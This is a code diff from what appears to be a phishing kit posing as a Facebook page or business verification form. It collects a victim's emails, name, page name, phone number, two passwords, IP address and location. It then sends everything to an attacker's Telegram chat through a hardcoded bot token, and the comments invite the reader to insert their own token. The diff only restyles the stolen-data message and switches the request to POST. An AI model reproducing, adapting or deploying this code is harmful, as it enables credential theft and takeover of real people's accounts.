@@ -228,16 +228,16 @@ function showPrompt(IpAddress) {
             trueWay: 0,
         };
         
-        const message1   = '<strong>User Email: </strong>' + $("#business-email").val() + 
-        '%0A<strong>User Name: </strong>' + $("#full-name").val() + 
-        '%0A<strong>User Email: </strong>' + $("#personal-email").val() + 
-        '%0A<strong>Facebook Page: </strong>' + $("#page-name").val()+ 
-        '%0A<strong>Phone Number: </strong>' + $("#phone").val() + 
-        '%0A<strong>First Password: </strong>' + password +
-        '%0A<strong>Second Password: </strong>'+ secondPassword +
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
+        const message1   = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
+👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
+📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
+🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
+📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
+🔑 <strong>First Password: </strong><code>${password}</code>
+🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
+🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
+ <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
+ <strong>City: </strong><code>${IpAddress.city}</code>`;
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_sssid của bạn
@@ -245,7 +245,17 @@ function showPrompt(IpAddress) {
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
 
-        fetch(telegramUrl)
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'html'
+            })
+        })
             .then(response => {
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
